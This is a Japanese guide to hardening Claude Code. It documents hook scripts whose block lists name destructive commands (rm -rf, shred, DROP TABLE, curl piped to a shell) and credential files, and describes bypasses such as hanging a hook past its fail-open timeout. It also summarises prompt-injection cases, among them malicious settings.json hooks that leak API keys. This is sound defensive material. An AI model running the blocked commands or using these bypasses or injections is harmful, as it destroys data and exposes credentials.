Claude Codeが使用するファイル操作・コマンド実行ツールは次のとおり。

| ツール | 操作 |
|---|---|
| `Edit` | 既存ファイルの一部を差し替える |
| `MultiEdit` | 同一ファイルに複数の編集を1回の呼び出しで適用する |
| `Write` | ファイルを新規作成または全体を上書きする |
| `Bash` | シェルコマンドを実行する |

実行フックのファイル名は例であり、任意の名前で作成できる。

| 役割 | マッチャー | 実行フック（例） |
|---|---|---|
| 機密ファイル保護 | `Edit` / `MultiEdit` / `Write` | `file-protect.sh` |
| 破壊的コマンドの確認・ブロック | `Bash` | `bash-guard.sh`・`dangerous-guard.sh` |

以下の各hookはシェルスクリプトとして作成し、`settings.json`のhooksセクションにコマンドパスを登録する。

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          { "type": "command", "command": "/path/to/bash-guard.sh", "timeout": 10 },
          { "type": "command", "command": "/path/to/dangerous-guard.sh", "timeout": 5 }
        ]
      },
      {
        "matcher": "Edit|MultiEdit|Write",
        "hooks": [
          { "type": "command", "command": "/path/to/file-protect.sh", "timeout": 5 }
        ]
      }
    ]
  }
}
```

スクリプトはexitコードで結果を返す。

| exitコード | 動作 |
|---|---|
| 0 | 通過（実行を許可） |
| 1 + stderr出力 | deny（実行を拒否し、stderrの内容をユーザーに表示） |
| 2 + stderr出力 | ask（ユーザーに確認を求める） |

`timeout`フィールドで各hookの最大実行時間を秒単位で指定する。タイムアウト時の挙動はフェイルオープンである。制限時間を超えるとプロセスが強制終了されてエラーがトランスクリプトに記録されるが、ツールの実行は続行される（exit 1相当の非ブロッキングエラー）。未設定時のデフォルトはコマンドフックで600秒。

タイムアウトはUX上の理由で短く設定する。デフォルト600秒のままだとスクリプトがハングした際にClaudeが長時間停止するため、5〜10秒程度に抑える。

hooksはベストエフォートのガードであり、強制力を持つセキュリティ境界ではない。タイムアウト時の動作はフェイルオープン（ツール実行を続行）に固定されており、設定で変更できない。つまり攻撃者がhookをハングさせる（無限ループを誘発するペイロードを送り込む等）ことで迂回できる可能性がある。

この制約への対応策は2つある。

① hookの実装を軽量・決定的にする  
外部I/O（ネットワーク呼び出し・重いファイル読み込み）を排除し、純粋な文字列パターンマッチングのみで判定する。これによりhookは100ms以内に終了し、タイムアウトに達することがない。ハングの原因自体をなくすのがもっとも確実な対策。

② 強制力が必要な制御はsandbox層で担保する  
ネットワーク遮断やファイルシステム隔離など、「必ず止めなければならない」操作はOS・コンテナー層で強制する（§7参照）。hooksはあくまで「うっかりミスを防ぐ確認レイヤー」と位置づけ、セキュリティの主軸は置かない。

### bash-guard.sh

Bashツール実行前の安全確認。descriptionの必須化と操作別の確認フローを実装する。

| ルール | 判定 | リスク（なぜ止めるか） | 確認・ブロック内容（何を表示・何をさせるか） |
|---|---|---|---|
| description が空 | deny | 意図不明なコマンドはリスク判断できない | コマンドをブロックし、`description`を付けて再実行するよう促すメッセージを表示する |
| バックスラッシュ改行（継続行） | deny | `allowedTools`のglobパターンは改行文字にマッチしない。`any-command \`＋改行で継続行に分割すると、危険・安全を問わずパターン判定を回避できる | コマンドをブロックし、Claudeに継続行を使わない1行形式へ自動で書き直させる |
| `rm`単体 / `unlink` / `truncate` | ask | git未管理（untracked）のファイルを削除すると復元できない。意図しない削除を防ぐ | 削除・切り詰め対象のファイルパスを表示し、続行するか確認させる |
| `git push`（通常） | ask | pushすると他者がfetchできる状態になる。意図しないブランチへの公開や機密情報の混入を防ぐ | push先のリモート名・ブランチ名を表示し、続行するか確認させる |
| `git push --force-with-lease` | ask | リモートブランチを上書きする。`--force-with-lease`は他者の新規コミットを守るが、自分の履歴は上書きされる | 上書き対象のリモート名・ブランチ名を表示し、続行するか確認させる |
| `git push --force` / `-f` | ask | `--force`はリモートの状態を問わず上書きする。他者のコミットが消える可能性がある | 上書き対象のリモート名・ブランチ名を表示し、続行するか確認させる |
| `git commit --amend` | ask | amendはコミットハッシュを書き換える。リモートにpush済みのコミットをamendするとハッシュが変わり、他者が取得済みの履歴と乖離してforce pushが必要になる | 直前のコミットメッセージと変更差分を表示し、amendを続行するか確認させる |
| `git commit`（通常） | ask | Claudeが意図せず余計なファイルをステージしていたり、コミットメッセージが不正確な場合がある | ステージ済みファイル一覧とコミットメッセージを表示し、コミットを続行するか確認させる |
| 作業記録ファイルがステージ済み | deny | コミット禁止と定めたセッション中の一時ファイルがステージに含まれているとコミット履歴が汚染される | コミットをブロックし、検出したファイルパスを表示して`git restore --staged <file>`でアンステージするよう促す |
| 保護ブランチ上での`git merge` | deny | 保護ブランチへの直接mergeはPRレビュー・CI・承認フローを迂回する。レビューなしの変更が保護ブランチに入る | mergeをブロックし、フィーチャーブランチからPRを作成するよう促す |
| `git reset --hard` | ask | ステージ済み・ワーキングツリー両方の未コミット変更が失われる。コミットしていなければ復元できない | リセット対象のコミットと失われる変更の概要（`git diff HEAD`相当）を表示し、続行するか確認させる |
| `gh pr merge` | ask | マージ後の取り消しはrevertコミットを作るしかない。squash mergeなら個別コミットも消える。CI/CDと連動している場合は即座にデプロイが走る | PR番号・タイトル・マージ方法（merge/squash/rebase）を表示し、続行するか確認させる |
| `gh issue close` | ask | クローズすると購読者全員に通知が飛び、紐づくPR・マイルストーン・プロジェクトボードの状態も変わる。再オープンは可能だが通知は取り消せない | issue番号・タイトル・購読者数（取得できる場合）を表示し、クローズを続行するか確認させる |
| `gh api`の書き込みメソッド（`--method POST/PUT/PATCH/DELETE`、`-X`、`-f`） | ask | GitHubのデータを書き換え・削除する。インジェクション経由で悪用されると外部への情報送信経路にもなる | 実行するエンドポイント・メソッド・パラメーターを表示し、続行するか確認させる |

### dangerous-guard.sh

取り消し不可能な破壊的コマンドをdenyでブロックする。bash-guard.shと並列実行され、こちらのdenyが優先される。

| パターン | 判定 | リスク（なぜ止めるか） | ブロック内容（何をさせるか） |
|---|---|---|---|
| `rm -r` / `rm -rf` | deny | ディレクトリとその中身を再帰的に一括削除するために使う。git未管理ファイルも含まれ、削除後は復元できない | コマンドをブロックし、削除対象のパスを1つずつ明示した単体`rm`に書き直させる |
| `shred` | deny | ディスクからデータを復元されないよう、ファイルの内容をランダムデータで複数回上書きしてから削除するセキュア消去コマンド。通常の削除と異なりディスクレベルでも復元できない | コマンドをブロックし、通常の`rm`に書き直させる |
| `xargs rm/unlink/shred` | deny | 別コマンドの出力結果（ファイルリスト等）を引数として削除コマンドに渡し一括実行するために使う。実行前に削除対象の全容が確認できないまま大量削除が走る | コマンドをブロックし、削除対象を1ファイルずつ明示した形に書き直させる |
| `find -delete` / `find -exec rm` | deny | 条件に一致するファイルを検索と同時に削除するために使う。条件が広すぎると意図しないファイルも含まれる | コマンドをブロックし、まず`find`のみで対象を確認してから削除するよう促す |
| `DROP TABLE` / `DROP DATABASE` | deny | テーブル定義ごとデータを削除するために使う（`DELETE`と異なりデータだけでなくテーブル構造ごと消える）。バックアップなしでは復元できない | コマンドをブロックし、削除対象と代替手段（論理削除・バックアップ後の実行）を確認させる |
| `curl`/`wget`の出力を`\|`でシェル（`sh`・`bash`・`zsh`等）に渡すパターン | deny | リモートのセットアップスクリプトをワンライナーで手軽に実行するための慣習的な書き方。内容を確認する手順を省くため、悪意あるスクリプトがそのまま実行される。`bash`単体はClaudeが通常使うため対象外で、パイプによるダウンロード即実行の組み合わせのみを検出する | コマンドをブロックし、ダウンロードと実行を別ステップに分けて内容を確認するよう促す |

### file-protect.sh

機密ファイル・lock filesへの直接編集をブロックする。Edit / MultiEdit / Writeツールに対して動作する。

| 対象 | 判定 | リスク（なぜ止めるか） | 確認・ブロック内容（何を表示・何をさせるか） |
|---|---|---|---|
| `.env` / `.npmrc` / `.netrc` | deny | APIキー・認証情報を含む。直接編集で秘密情報が破損・漏洩するリスクがある | 編集をブロックし、環境変数の追加・変更は所定の手順（dotenv管理・シークレットマネージャー等）で行うよう促す |
| `.pem` / `.key` / `.p12` / `.pfx` / `.cert` / `.crt` | deny | 秘密鍵・証明書。直接編集すると認証基盤が壊れる | 編集をブロックし、証明書の更新は発行手順から実施するよう促す |
| `.git/`内部 | deny | Gitリポジトリの内部ファイル。直接編集するとリポジトリが破損する | 編集をブロックし、gitコマンドで操作するよう促す |
| `package-lock.json` / `yarn.lock` / `pnpm-lock.yaml` / `bun.lock` | deny | パッケージマネージャーが自動生成するlock file。直接編集すると依存関係の整合性が壊れる | 編集をブロックし、パッケージマネージャーのコマンド（`npm install`等）で更新するよう促す |
| `Pipfile.lock` / `poetry.lock` | deny | Pythonのlock file。直接編集すると依存関係の整合性が壊れる | 編集をブロックし、`pip`・`poetry`コマンドで更新するよう促す |
| `Gemfile.lock` / `composer.lock` / `go.sum` / `Cargo.lock` | deny | 各言語のlock file。直接編集すると依存関係の整合性が壊れる | 編集をブロックし、各言語のパッケージマネージャーコマンドで更新するよう促す |
| `.tfstate` / `.tfvars` | deny | Terraformのインフラ状態・変数ファイル。直接編集するとインフラの実態と状態ファイルが乖離する | 編集をブロックし、`terraform`コマンドで操作するよう促す |
| `.claude/hooks/` / `.claude/settings.json` | ask | ハーネス自身の設定ファイル。denyにするとhooksやallowリストの正当な変更もブロックされる。askにすることで正当な設定変更は承認できる | 編集対象のファイルパスと変更内容を表示し、続行するか確認させる |

---

## Layer 3: 運用ルール

hooksによる技術的対策でカバーできない領域。NRIセキュアの分析ではOWASPが定義するAIエージェントの脅威の73%（15件中11件）が従来の手法では検知困難と報告されている（[NRI セキュア](https://www.nri-secure.co.jp/blog/ai-agent-1)）。技術的ガードを補う運用ルールが不可欠。

### エージェントが「読む」コンテンツはすべて攻撃ベクター

| コンテンツ | リスク |
|---|---|
| `gh pr diff` / `gh issue view`の出力 | PR 本文・コメントにインジェクションが仕込まれている可能性がある |
| 外部リポジトリの README / CLAUDE.md / `.claude/settings.json`（clone） | cloneしてClaude Codeで開くと`.claude/settings.json`の hooks が自動実行される（CVE-2025-59536）。ファイル内のテキストにインジェクションが仕込まれている可能性もある |
| WebFetch で取得した外部コンテンツ（Webページ・ドキュメント・API レスポンス） | URLのレスポンスにインジェクションが仕込まれている可能性がある。cloneと異なりファイルシステムへの書き込みなしに任意のコンテンツをコンテキストに注入できる |
| WebSearch の検索結果スニペット | 攻撃者が検索結果に表示されるよう細工したページのスニペット（タイトル・抜粋テキスト）にインジェクションが含まれる可能性がある |
| `git log` / コミットメッセージ | 攻撃者がコミット時にメッセージへ指示を仕込める。外部リポジトリの履歴を参照させるときに注意が必要 |
| 依存パッケージの README / `package.json` | `npm install`後にClaude Codeがパッケージのドキュメントを参照するとき、コンテンツにインジェクションが含まれうる |
| `gh api graphql*`の結果 | GraphQL レスポンスに埋め込まれたペイロード。実行は allow されているが出力の信頼性は別問題 |
| MCP サーバーの出力 | コミュニティ MCP はコード内容が未検査。正規ツールを装った攻撃が実在する |

### 外部リポジトリを開く前のチェック

CVE-2025-59536では、攻撃者がリポジトリの`.claude/settings.json`に悪意あるhooksを仕込み、別の開発者がそのリポジトリをClaude Codeで開いた瞬間にhooksが自動実行されることでRCE（任意コード実行）とAPIキー漏洩が実証された。hookはシェルコマンドを実行できるため、一度実行されると検知が困難になる。

そのため、外部リポジトリをクローンしてClaude Codeで開く前に、必ず手動でhooksの内容を確認する。Claude Codeがディレクトリを開く前のタイミングはhooksで捕捉できないため、自動化できない。

```bash
# クローン後、Claude Code を開く前に実行
cat .claude/settings.json | jq '.hooks'
```

hooksの内容が不審な場合（知らないコマンドが登録されている等）は開かずに削除する。

### MCP サーバーの導入基準

1. **提供元のGitHubリポジトリを確認する**
   - コミット数が極端に少ない・スター数ゼロ・作成直後のリポジトリは実績がなく信頼性を判断できない
   - 最終更新が1年以上前はメンテナンス放棄の可能性がある
   - コードを読み、外部への通信・`exec`/`eval`の使用・環境変数（APIキー等）の読み取りが不審な箇所にないか確認する

2. **スキャンツールで解析する**

   [Socket](https://socket.dev/) はMCPサーバーのコードと依存パッケージを解析し、既知の悪意あるパターン・不審な通信・サプライチェーンリスクを検出する。

   ```bash
   npx socket scan <MCPサーバーのディレクトリ>
   ```

3. 読み取り専用から始め、書き込み系は段階的に導入する

4. **`settings.json`の`allow`で必要なツールだけを許可する**

   MCPサーバーが提供するツールのうち、実際に使うものだけを列挙する。サーバー全体を許可すると、使わないツール（ファイル書き込み・コマンド実行等）も有効になる。

   ```jsonc
   // .claude/settings.json
   {
     "permissions": {
       "allow": [
         "mcp__<サーバー名>__<必要なツール名>",
         "mcp__<サーバー名>__<必要なツール名>"
       ]
     }
   }
   ```

### リスクの判断

- プライベートリポジトリが主な対象の場合、攻撃者がリポジトリへのアクセス権を持つ必要があるためリスクは低い
- forkからの外部PRを扱うときはとくに注意する
- 外部リポジトリをクローンして参照させるときは「信頼できないコンテンツ」として扱う

### 差分確認の習慣（最後の防衛線）

エージェントが生成・変更したコードは必ず差分を確認してからコミットする。とくに以下のファイルへの予期しない変更はインジェクション攻撃の典型的な手口であり、注意が必要。

- `.claude/settings.json` — hooksにシェルコマンドを追加することで任意コードを実行できる（CVE-2025-59536の手口）
- `package.json` — `scripts`に仕込まれた場合、`npm install` / `npm run`のタイミングで実行される
- `.github/workflows/` — CI/CDパイプラインに悪意あるステップを追加し、サーバー上でコマンドを実行できる

```bash
git diff --stat   # 変更ファイルの一覧を確認
git diff          # 内容を確認
```

### バージョン管理

Claude Code自体も脆弱性の修正が継続的に行われている。古いバージョンは既知の脆弱性を抱えた状態で動作することになる。Anthropicは[ネイティブインストーラーを推奨している](https://code.claude.com/docs/en/security)。

```bash
# ネイティブインストーラーでインストール
curl -fsSL https://claude.ai/install.sh | bash
```

```bash
# インストール方法・自動更新の有効/無効・チャンネル・現在と最新バージョンを表示する
claude doctor
```

出力の`Updates`セクションで以下を確認する。

| 項目 | 確認内容 |
|---|---|
| `Auto-updates` | `enabled`であること。`disabled`の場合は手動で`claude update`を実行する必要がある |
| `Latest version` vs 現在のバージョン | 差異がある場合は`claude update`でアップデートする |

---

## 設計原則まとめ

| 原則 | 内容 |
|---|---|
| **最小権限** | 意図しない操作が実行されないよう、エージェントには必要な操作だけを許可し、globパターンで想定外のコマンドにマッチしていないことを確認する |
| **バイパス禁止** | 権限設定を一括で無効化できる機能は禁止する |
| **不可逆操作の制御** | 取り消せない操作（削除・上書き・パブリッシュ等）は実行前にユーザー確認を挟むかブロックする |
| **機密ファイルの保護** | インジェクションが成功してもデータを持ち出されないよう、認証情報や機密ファイルへの読み書きを禁止する |
| **セキュリティ設定の改ざん防止** | 改ざんに気づけるよう、セキュリティ上重要なファイルへの書き込みは常にユーザーの許可を求めるようにする |
| **操作の説明を必須にする** | 目的が不明なコマンドをそのまま実行させないよう、説明がないコマンドはブロックして書き直させる |
| **ソフトウェアチェックへの過信を避ける** | ソフトウェアによるチェックは実行を防げないケースや、ユーザーが誤って許可してしまうケースがあるため、絶対に通してはならない制御はOS層で担保する |
| **外部コンテンツを信頼しない** | エージェントが読む外部コンテンツ（PR・issue・外部ドキュメント・ツール出力）はすべてインジェクション経路になりうるため、疑わしいパターンを含むコンテンツを受け取ったらセッションを中断して確認する |
| **信頼できないコードを開かない** | 外部リポジトリをコードエージェントで開く前に、フックに不審なコマンドが登録されていないかを確認する。開いた瞬間にフックが自動実行されるため、確認はエージェント起動前に行う |
| **外部ツールの事前審査** | 外部ツールはコード・コミット履歴・スキャン結果を確認してから導入し、必要なものだけを許可する。スキャンには`socket`（サプライチェーンリスク検出）や`semgrep`（セキュリティパターンの静的解析）が使える |
| **変更の目視確認** | エージェントが変更したコードはコミット前に差分を確認する。設定ファイル・依存関係の定義・CIワークフローへの予期しない変更はインジェクションの手口 |
| **最新版の維持** | AIエージェントの自動更新を有効にし、ライブラリを定期的にアップデートすることで、既知の脆弱性を残さない |

---

## 参考文献

### 海外

#### 標準・フレームワーク

1. [OWASP Top 10 for LLM Applications 2025](https://owasp.org/www-project-top-10-for-large-language-model-applications/) — OWASP Foundation。LLMアプリケーション固有の脆弱性上位10件。プロンプトインジェクション（LLM01）・過剰権限（LLM06）を定義
2. [OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) — OWASP Gen AI Security Project（2025年12月公開）。エージェント固有のリスクをフレームワーク化
3. [OWASP MCP Top 10](https://owasp.org/www-project-mcp-top-10/) — OWASP Foundation。Model Context Protocol固有のセキュリティリスク
4. [NIST IR 8596 iprd: Cybersecurity Framework Profile for Artificial Intelligence](https://csrc.nist.gov/pubs/ir/8596/iprd) — NIST（2025年12月）。NIST CSF 2.0を基盤にAIシステムのサイバーセキュリティリスク管理を定めた政府標準ガイドライン

#### 脆弱性・CVE

5. [CVE-2025-53773: GitHub Copilot Remote Code Execution via Prompt Injection](https://embracethered.com/blog/posts/2025/github-copilot-remote-code-execution-via-prompt-injection/) — Embrace The Red（Johann Rehberger）。コードコメントへのインジェクションでYOLOモード有効化・任意コード実行を実証。CVSS 7.8 HIGH
6. [Caught in the Hook: RCE and API Token Exfiltration Through Claude Code Project Files](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/) — Check Point Research（2026年2月）。CVE-2025-59536（CVSS 8.7）・CVE-2026-21852を報告。`.claude/settings.json`のhooksを悪用
7. [EchoLeak: Zero-Click AI Vulnerability — CVE-2025-32711](https://www.catonetworks.com/blog/breaking-down-echoleak/) — Aim Labs / Cato Networks（2025年6月）。Microsoft 365 Copilotにおいて細工したメール1通だけで組織内の機密データを窃取できるゼロクリックAIエージェント脆弱性として報告された。CVSS 9.3
8. [CamoLeak: Critical GitHub Copilot Vulnerability Leaks Private Source Code](https://www.legitsecurity.com/blog/camoleak-critical-github-copilot-vulnerability-leaks-private-source-code) — Legit Security（2025年10月）。GitHubのCamo画像プロキシを悪用したCSPバイパスとリモートプロンプトインジェクションの組み合わせでプライベートリポジトリのソースコードを窃取。CVSS 9.6
9. [Rules File Backdoor: New Vulnerability in GitHub Copilot and Cursor](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents) — Pillar Security（2025年3月）。`.cursor/rules`等の設定ファイルにUnicode不可視文字を埋め込みAIコード生成を汚染するサプライチェーン型攻撃手法

#### 学術論文

10. [Not what you've signed up for: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection](https://arxiv.org/abs/2302.12173) — arXiv:2302.12173（Greshake et al.）。LLM統合アプリへの間接プロンプトインジェクションを分類・実証した先駆的論文
11. ["Your AI, My Shell": Demystifying Prompt Injection Attacks on Agentic AI Coding Editors](https://arxiv.org/abs/2509.22040) — arXiv:2509.22040（2025年9月）。Cursor・Copilot等に対する314種の攻撃ペイロードを検証。成功率41〜84%
12. [Memory Poisoning Attack and Defense on Memory Based LLM-Agents](https://arxiv.org/abs/2601.05504) — arXiv:2601.05504（2026年1月）。MINJAによるメモリポイズニング攻撃。成功率95%超を報告
13. [MemoryGraft: Persistent Memory Poisoning in LLM Agents](https://arxiv.org/html/2512.16962v1) — arXiv:2512.16962（2025年12月）。成功体験の模倣傾向を悪用した永続的メモリ汚染手法
14. [AgentSentry: Mitigating Indirect Prompt Injection in LLM Agents](https://arxiv.org/html/2602.22724v1) — arXiv:2602.22724（2026年2月）。時間的因果診断とコンテキスト浄化による間接インジェクション防御

#### 公式ドキュメント・企業リサーチ

15. [Mitigating the risk of prompt injections in browser use](https://www.anthropic.com/research/prompt-injection-defenses) — Anthropic Research（2025年11月）。Claude Opus 4.5を用いたブラウザエージェントでプロンプトインジェクション成功率を1.4% まで抑えた防御研究
16. [Beyond permission prompts: making Claude Code more secure and autonomous](https://www.anthropic.com/engineering/claude-code-sandboxing) — Anthropic Engineering（2025年10月）。ファイルシステム・ネットワーク隔離によるサンドボックスがインジェクション成功時の被害範囲を限定する仕組みを解説
17. [Claude Code auto mode: a safer way to skip permissions](https://www.anthropic.com/engineering/claude-code-auto-mode) — Anthropic Engineering。Auto Modeの2層防御設計（プロンプトインジェクション検知＋トランスクリプト分類器）と偽陰性率17%の限界を解説
18. [Claude Code Security](https://www.anthropic.com/news/claude-code-security) — Anthropic（研究プレビュー）。Claudeによるコードベースの脆弱性スキャン・修正提案機能。内部チームがClaude Opus 4.6で本番コードベースから500以上の脆弱性を発見
19. [Claude Code Security documentation](https://code.claude.com/docs/en/security) — Anthropic公式ドキュメント。組み込み保護機能・パーミッション設計・MCPセキュリティ・クラウド実行環境のセキュリティを網羅
20. [MCP Tools: Attack Vectors and Defense Recommendations for Autonomous Agents](https://www.elastic.co/security-labs/mcp-tools-attack-defense-recommendations) — Elastic Security Labs。MCPツールの攻撃ベクターと防御推奨事項
21. [11 Emerging AI Security Risks with MCP](https://checkmarx.com/zero-post/11-emerging-ai-security-risks-with-mcp-model-context-protocol/) — Checkmarx Zero。MCP固有の11リスク。43% のサーバーにコマンドインジェクション脆弱性があると報告
22. [Agentic AI Threats: Memory Poisoning & Long-Horizon Goal Hijacks](https://www.lakera.ai/blog/agentic-ai-threats-p1) — Lakera。エージェント固有の脅威（メモリポイズニング・長期ゴール奪取）の詳細解説
23. [Every Practical and Proposed Defense Against Prompt Injection](https://github.com/tldrsec/prompt-injection-defenses) — tldrsec（GitHub）。プロンプトインジェクション防御手法の網羅的リスト（実践済み・提案済みの両方）

---

### 国内

#### 公的機関・ガイドライン

1. [AIのセキュリティ確保のための技術的対策に係るガイドライン](https://ailaw.co.jp/blog/ai%E3%81%AE%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E7%A2%BA%E4%BF%9D%E3%81%AE%E3%81%9F%E3%82%81%E3%81%AE%E6%8A%80%E8%A1%93%E7%9A%84%E5%AF%BE%E7%AD%96%E3%81%AB%E4%BF%82%E3%82%8B%E3%82%AC/) — 総務省（2026年3月公表）。学習・推論・周辺システムの3レイヤーで「多層防御」を規定するガイドライン
2. [IPA AIセキュリティ短信 2026年3月号](https://scan.netsecurity.ne.jp/article/2026/04/07/54993.html) — IPA（2026年4月公開）。AIシステム開発者・セキュリティ担当者向けの最新動向・インシデント事例

#### AIエージェント攻撃手法

3. [80種類のAIエージェントのセキュリティ脅威を網羅的に整理（2026年3月版）](https://prtimes.jp/main/html/rd/p/000000084.000037237.html) — コーレ株式会社（2026年3月）。プロンプトインジェクション系16種・MCP/ツール攻撃14種・RAG汚染8種等を含む164ページの攻撃カタログ
4. [AIエージェント時代のセキュリティ設計｜脅威の73%は検知困難](https://www.nri-secure.co.jp/blog/ai-agent-1) — NRIセキュア。OWASP定義のAIエージェント脅威15件中11件が従来手法では検知困難と報告
5. [Claude Codeのセキュリティ設定を本気で固めた話](https://zenn.dev/momozaki/articles/10cf58b08de335) — Zenn（momozaki、2026年4月）。`disableBypassPermissionsMode`・sandboxネットワーク制限・file-history定期削除などClaude Code固有の実践的設定を網羅

#### Claude Code 固有

6. [Claude Code / MCP を安全に使うための実践ガイド](https://zenn.dev/ytksato/articles/057dc7c981d304) — Zenn（ytksato）。8桁後半の実被害事例から学ぶClaude Code・MCPの安全な使い方
7. [【2026年最新版】Claude Codeで行うべきセキュリティ設定10選](https://qiita.com/miruky/items/51db293a7a7d0d277a5d) — Qiita（miruky）。permissions・hooks・MCPの具体的な設定10項目
8. [CLAUDE.mdのセキュリティ設計 - プロンプトインジェクション対策とベストプラクティス](https://qiita.com/pythonista0328/items/595b4998faede905dd6c) — Qiita（pythonista0328）。CLAUDE.md自体が攻撃標的になるリスクと対策
9. [Claude Code Hooksでプロンプトインジェクション対策を実装した話](https://zenn.dev/hareki_aoi/articles/claude-code-hooks-security) — Zenn（hareki_aoi）。PreToolUse hooksによる実装例
10. [Claude Code セキュリティ詳解：Permissions、Sandbox、Dev Container などによる実行保護の仕組み](https://zenn.dev/mimimi193/articles/claude-code-guardrails-best-practices-20260301) — Zenn（mimimi193、2026年3月）。Claude Codeの実行保護機能の包括的解説
11. [Claude Code もろもろのセキュリティ周りの件で、Claudeにセルフチェックさせる指示文を共有](https://qiita.com/WdknWdkn/items/33357ef91d10d47f959f) — Qiita（WdknWdkn）。エージェント自身にセキュリティチェックを行わせるプロンプト設計
12. [Claude Code HooksのPreToolUseでは保護ディレクトリのプロンプトを消せない——PermissionRequestが正解](https://qiita.com/yurukusa/items/8cd5338d1aa8bcebed1f) — Qiita（yurukusa）。hooksの動作仕様とPermissionRequestの正しい使い方
13. [Claude Codeに致命的脆弱性〜リポジトリをcloneするだけでRCE＋APIキー漏洩〜](https://qiita.com/GeneLab_999/items/a02a5d32f472e3265397) — Qiita（GeneLab_999）。CVE-2025-59536・CVE-2026-21852の解説と対策

#### MCP・スキルのセキュリティ

14. [CC Hooks 実践ガイド — 品質ガードレールをコードで自動化する](https://qiita.com/SeckeyJP/items/b593f60a90a48a492c27) — Qiita（SeckeyJP）。hooksによる品質・セキュリティの自動チェック実装
15. [生成AI活用のための主要ガイドライン総まとめ](https://qiita.com/akiraokusawa/items/6194fa1ae0a947693b45) — Qiita（akiraokusawa）。国内外の主要ガイドラインを横断整理

#### プロンプトインジェクション

16. [Claude / Claude Codeのプロンプトインジェクションの対策について調べてみた](https://qiita.com/ktdatascience/items/1bee64d92b0cbcf95c5f) — Qiita（ktdatascience）。Claude・Claude Code固有のプロンプトインジェクション耐性と対策の調査
17. [総務省AIセキュリティガイドラインを読んで軽くまとめた](https://qiita.com/naokami/items/1373aa0dba37a5a3683c) — Qiita（naokami、2026年4月）。直接・間接インジェクション・`ANTHROPIC_BASE_URL`変更攻撃・入力タグ分離（`[USER_INPUT]`/`[EXTERNAL_DATA]`）など総務省ガイドラインの要点整理
18. [プロンプトインジェクションとは？AI利用の拡大によって発生する被害リスクと対策](https://licensecounter.jp/cyber-security/blog/security/prompt-injection.html) — サイバーセキュリティ相談センター。基礎から実践的対策まで
19. [AI駆動開発セキュリティ実践ガイド：生成コードとAIエージェントのリスク対策](https://cloud-ace.jp/column/detail538/) — クラウドエース。AIが生成するコードのセキュリティリスクと審査プロセス
20. [【2025年版】生成AI活用に不可欠なセキュリティ対策完全ガイド](https://zenn.dev/headwaters/articles/7f7711b6c6cecc) — Zenn（headwaters）。企業が実施すべきセキュリティ対策の実践チェックリスト

---

## 関連ドキュメント

- [設定例・実装例](./examples.md) — hooksの具体的なコード例
- [AIコーディングエージェント: チーム運用](../ai-coding-agents/claude-code/team-operation.md) — Permission・Hooksのチーム共有設定
- [skills.sh セキュリティ監査](../ai-coding-agents/skills-sh.md#セキュリティ監査) — 外部スキル導入前のチェック方法
